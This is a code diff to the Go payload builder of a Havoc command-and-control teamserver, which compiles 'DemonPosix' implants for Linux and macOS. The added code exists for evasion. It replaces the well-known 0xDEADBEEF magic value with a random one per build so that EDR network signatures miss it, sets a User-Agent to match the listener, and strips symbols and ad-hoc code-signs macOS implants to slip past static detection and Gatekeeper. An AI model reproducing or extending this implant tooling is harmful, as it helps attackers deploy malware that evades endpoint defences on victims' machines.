@@ -20,6 +20,8 @@ package builder
  */
 
 import (
+	"encoding/binary"
+	crand "crypto/rand"
 	"fmt"
 	"os"
 	"os/exec"
@@ -70,10 +72,15 @@ type PosixBuilder struct {
 	Arch   int
 
 	/* C2 listener parameters */
-	Host string
-	Port int
-	Uri  string
-	Ssl  bool
+	Host      string
+	Port      int
+	Uri       string
+	Ssl       bool
+	UserAgent string // must match listener's configured User-Agent exactly
+
+	/* Evasion — override the default 0xDEADBEEF magic value with a random
+	 * one generated per-build to avoid network signature detection. */
+	MagicValue uint32
 
 	OutputPath string
 	CompileDir string
@@ -83,11 +90,23 @@ type PosixBuilder struct {
 
 /* ── NewPosixBuilder ─────────────────────────────────────────────────── */
 func NewPosixBuilder(cfg PosixBuilderConfig) *PosixBuilder {
+	// Generate a random magic value per build — avoids the well-known
+	// 0xDEADBEEF signature that EDRs use to flag Havoc traffic.
+	var magicBuf [4]byte
+	if _, err := crand.Read(magicBuf[:]); err != nil {
+		// Fallback to time-based seed if crypto/rand fails
+		magicBuf = [4]byte{0xCA, 0xFE, 0xBA, 0xBE}
+	}
+	magic := binary.BigEndian.Uint32(magicBuf[:])
+	// Ensure it's not 0x00000000 or 0xFFFFFFFF (edge cases)
+	if magic == 0 || magic == 0xFFFFFFFF { magic = 0xC0FFEE42 }
+
 	pb := &PosixBuilder{
 		config:     cfg,
 		sourcePath: utils.GetTeamserverPath() + "/" + PayloadDir + "/DemonPosix",
 		Target:     POSIX_TARGET_LINUX_EXE,
 		Arch:       ARCHITECTURE_X64,
+		MagicValue: magic,
 	}
 
 	/* Auto-detect zig (used for Linux cross-compilation from macOS) */
@@ -196,11 +215,16 @@ func (pb *PosixBuilder) Build() bool {
 	args = append(args, fmt.Sprintf("-DCONFIG_HOST=\"%s\"", escapeDefine(pb.Host)))
 	args = append(args, fmt.Sprintf("-DCONFIG_PORT=%d", pb.Port))
 	args = append(args, fmt.Sprintf("-DCONFIG_URI=\"%s\"", escapeDefine(pb.Uri)))
-        args = append(args, fmt.Sprintf("-DCONFIG_USERAGENT=\"%s\"", "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"))
 	if pb.Ssl {
 		args = append(args, "-DCONFIG_SSL=1")
 	} else {
 		args = append(args, "-DCONFIG_SSL=0")
+	}
+	// Random magic value per build — avoids 0xDEADBEEF network signature
+	args = append(args, fmt.Sprintf("-DCONFIG_MAGIC=0x%08X", pb.MagicValue))
+	// User-Agent — must exactly match what the listener expects
+	if pb.UserAgent != "" {
+		args = append(args, fmt.Sprintf("-DCONFIG_UA=\"%s\"", escapeDefine(pb.UserAgent)))
 	}
 
 	/* Debug / release */
@@ -229,7 +253,6 @@ func (pb *PosixBuilder) Build() bool {
 		// zig cc + musl: pthread is bundled, no curl needed (raw socket transport)
 		// -static produces a fully static binary with zero runtime dependencies
 		args = append(args, "-static")
-                args = append(args, "-lssl", "-lcrypto", "-lz", "-lzstd")
 	} else {
 		// macOS: use system libcurl (always available) + CoreFoundation
 		args = append(args, "-lcurl", "-lpthread")
@@ -252,6 +275,30 @@ func (pb *PosixBuilder) Build() bool {
 	if err != nil {
 		pb.msg("Error", "Compilation failed: "+err.Error())
 		return false
+	}
+
+	// Post-build: strip symbols + ad-hoc code sign for macOS targets.
+	// This removes debug symbols (reduces static signature surface) and
+	// satisfies macOS Gatekeeper for unsigned binaries on newer OS versions.
+	isMacOSTarget := pb.Target == POSIX_TARGET_MACOS_EXE || pb.Target == POSIX_TARGET_MACOS_DYLIB
+	if isMacOSTarget {
+		// Strip all symbols
+		if stripPath, err := exec.LookPath("strip"); err == nil {
+			stripCmd := exec.Command(stripPath, "-x", pb.OutputPath)
+			if out, err := stripCmd.CombinedOutput(); err != nil {
+				pb.msg("Warn", "strip failed: "+string(out))
+			}
+		}
+		// Ad-hoc code sign (no identity needed — just makes it runnable on macOS)
+		if csignPath, err := exec.LookPath("codesign"); err == nil {
+			csignCmd := exec.Command(csignPath, "--sign", "-", "--force",
+				"--timestamp=none", pb.OutputPath)
+			if out, err := csignCmd.CombinedOutput(); err != nil {
+				pb.msg("Warn", "codesign failed (non-fatal): "+string(out))
+			} else {
+				pb.msg("Info", "Binary stripped and ad-hoc signed")
+			}
+		}
 	}
 
 	pb.msg("Good", fmt.Sprintf("DemonPosix built successfully: %s", pb.OutputPath))
